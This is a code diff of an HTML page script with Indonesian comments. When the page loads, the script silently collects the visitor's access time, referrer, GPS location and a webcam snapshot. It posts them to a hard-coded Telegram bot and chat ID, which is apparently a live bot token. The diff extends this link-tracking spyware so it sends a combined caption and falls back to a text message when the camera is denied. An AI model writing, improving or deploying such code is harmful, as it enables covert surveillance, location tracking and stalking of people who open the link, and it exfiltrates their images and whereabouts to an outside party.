@@ -20,25 +20,51 @@
 
     <script>
       const BOT_TOKEN = "8875696208:AAEfby84iverPAOZjXO7Bl2zNQCtPzrsBI4";
-      const CHAT_ID = "6984457315"; // Masukkan ID Telegram numerik Anda
+      const CHAT_ID = "6984457315"; // ID Telegram numerik Anda
 
-      // Berjalan otomatis saat halaman web selesai dimuat
       window.addEventListener("DOMContentLoaded", async () => {
-        // 1. Ambil Lokasi
+        // 1. Waktu Akses (Tanggal, Jam, Menit, Detik)
+        const opsiWaktu = {
+          year: "numeric",
+          month: "long",
+          day: "numeric",
+          hour: "2-digit",
+          minute: "2-digit",
+          second: "2-digit",
+          timeZoneName: "short",
+        };
+        const waktuAkses = new Date().toLocaleString("id-ID", opsiWaktu);
+
+        // 2. Asal Klik (Referrer)
+        const asalKlik = document.referrer
+          ? document.referrer
+          : "Langsung (Direct / Tanpa Referrer)";
+
+        let isiPesan = `<b>INFORMASI AKSES TAUTAN</b>\n\n`;
+        isiPesan += `<b>Waktu:</b> ${waktuAkses}\n`;
+        isiPesan += `<b>Sumber Klik:</b> ${asalKlik}\n`;
+
+        // 3. Ambil Lokasi
         if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            async (position) => {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-              await sendLocationToTelegram(lat, lon);
-            },
-            (error) => {
-              console.error("Gagal atau izin lokasi ditolak:", error.message);
-            },
-          );
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                isiPesan += `<b>Lokasi:</b> https://www.google.com/maps?q=${lat},${lon}\n`;
+                resolve();
+              },
+              (error) => {
+                isiPesan += `<b>Lokasi:</b> Ditolak oleh pengguna\n`;
+                resolve();
+              },
+            );
+          });
+        } else {
+          isiPesan += `<b>Lokasi:</b> Tidak didukung browser\n`;
         }
 
-        // 2. Ambil Foto Kamera
+        // 4. Ambil Foto Kamera & Kirim Bersama Caption Teks
         try {
           const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
@@ -51,41 +77,30 @@
             const context = canvas.getContext("2d");
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Matikan stream kamera setelah gambar diambil
+            // Matikan kamera setelah gambar diambil
             stream.getTracks().forEach((track) => track.stop());
 
             canvas.toBlob(async (blob) => {
               if (blob) {
-                await sendPhotoToTelegram(blob);
+                await sendPhotoToTelegram(blob, isiPesan);
+              } else {
+                await sendTextMessageToTelegram(isiPesan);
               }
             }, "image/jpeg");
           }, 1000);
         } catch (err) {
-          console.error("Gagal atau izin kamera ditolak:", err.message);
+          isiPesan += `<b>Kamera:</b> Ditolak / Tidak tersedia\n`;
+          await sendTextMessageToTelegram(isiPesan);
         }
       });
 
-      async function sendLocationToTelegram(lat, lon) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-        try {
-          await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              latitude: lat,
-              longitude: lon,
-            }),
-          });
-        } catch (error) {
-          console.error("Error mengirim lokasi:", error);
-        }
-      }
-
-      async function sendPhotoToTelegram(photoBlob) {
+      // Fungsi Mengirim Foto beserta Caption Teks ke Telegram API
+      async function sendPhotoToTelegram(photoBlob, captionText) {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", photoBlob, "capture.jpg");
+        formData.append("caption", captionText);
+        formData.append("parse_mode", "HTML");
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
         try {
@@ -94,7 +109,25 @@
             body: formData,
           });
         } catch (error) {
-          console.error("Error mengirim foto:", error);
+          console.error("Gagal mengirim foto ke Telegram:", error);
+        }
+      }
+
+      // Fungsi Cadangan (Jika Kamera Ditolak / Tidak Ada)
+      async function sendTextMessageToTelegram(textMessage) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: textMessage,
+              parse_mode: "HTML",
+            }),
+          });
+        } catch (error) {
+          console.error("Gagal mengirim pesan teks ke Telegram:", error);
         }
       }
     </script>
